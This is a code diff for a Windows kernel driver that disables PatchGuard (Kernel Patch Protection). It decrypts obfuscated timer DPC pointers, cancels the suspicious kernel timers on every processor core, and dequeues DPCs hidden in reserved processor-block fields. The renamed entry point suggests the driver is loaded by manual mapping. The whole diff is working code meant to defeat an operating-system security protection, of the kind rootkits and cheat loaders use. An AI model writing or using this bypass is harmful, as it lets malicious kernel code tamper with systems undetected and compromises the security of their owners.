@@ -6,7 +6,13 @@ PKDPC decrypt_dpc_routine(PKTIMER timer) {
 
 	static __int64 KiWaitNever;
 	static __int64 KiWaitAlways;
-	
+
+	UNICODE_STRING routineName;
+	RtlInitUnicodeString(&routineName, L"KeSetTimerEx");
+	PVOID KeSetTimerEx = MmGetSystemRoutineAddress(&routineName);
+	if (!KeSetTimerEx)
+		return nullptr;
+
 	if (!KiWaitNever || !KiWaitAlways) {
 		unsigned char function_dism[64];
 		RtlCopyMemory(function_dism, KeSetTimerEx, sizeof(function_dism));
@@ -23,19 +29,18 @@ PKDPC decrypt_dpc_routine(PKTIMER timer) {
 		}
 	}
 
-	PKDPC dpc_routine = (PKDPC)(
+	return (PKDPC)(
 		KiWaitAlways ^ _byteswap_uint64((unsigned __int64)timer ^ __ROL8__(
 			(__int64)timer->Dpc ^ KiWaitNever, KiWaitNever
 		)));
-
-	return dpc_routine;
 }
 
-extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+extern "C" NTSTATUS FxDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(DriverObject);
 	UNREFERENCED_PARAMETER(RegistryPath);
 
 	KAFFINITY active_processers = KeQueryActiveProcessors();
+	bool patchguard_disabled = false;
 
 	for (int core = 0; active_processers; core++, active_processers >>= 1) {
 		if (active_processers & 1) {
@@ -44,6 +49,20 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 			PKPRCB processer_block = KeGetCurrentPrcb();
 			if (!processer_block) {
 				continue;
+			}
+
+			if (processer_block->AcpiReserved) {
+				PKDPC dpc = (PKDPC)processer_block->AcpiReserved;
+				if (KeRemoveQueueDpc(dpc)) {
+					patchguard_disabled = true;
+				}
+			}
+
+			if (processer_block->HalReserved[7]) {
+				PKDPC dpc = (PKDPC)processer_block->HalReserved[7];
+				if (KeRemoveQueueDpc(dpc)) {
+					patchguard_disabled = true;
+				}
 			}
 
 			PKTIMER_TABLE timer_table = &processer_block->TimerTable;
@@ -59,7 +78,7 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 					if (!timer_entry || !MmIsAddressValid(timer_entry)) {
 						continue;
 					}
-		
+
 					PKTIMER timer = CONTAINING_RECORD(timer_entry->Entry.Flink, KTIMER, TimerListEntry);
 					if (!timer || !MmIsAddressValid(timer)) {
 						continue;
@@ -71,8 +90,8 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 					}
 
 					if ((__int64)dpc->DeferredContext >> 47 != -1 && (__int64)dpc->DeferredContext >> 47 != 0) {
-						if (!KeCancelTimer(timer)) {
-							return STATUS_UNSUCCESSFUL;
+						if (KeCancelTimer(timer)) {
+							patchguard_disabled = true;
 						}
 					}
 
@@ -81,5 +100,6 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 		}
 	}
 
-	return STATUS_SUCCESS;
+	return patchguard_disabled ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 }
+
